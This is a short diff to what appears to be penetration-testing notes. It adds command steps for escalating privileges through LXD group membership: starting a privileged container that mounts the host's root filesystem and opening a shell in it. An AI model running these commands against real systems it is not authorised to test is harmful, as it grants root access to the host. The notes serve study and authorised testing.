@@ -249,6 +249,13 @@ $ lxd init
 $ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
 $ lxc init alpine r00t -c security.privileged=true
 $ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
+$ lxc start r00t
+$ lxc exec r00t /bin/sh
+```
+%% if you are a member of lxd after using id command you can follow these steps to escalate your privilege and spawn a shell in the container instance %%
+
+```
+$ 
 ```
 
 
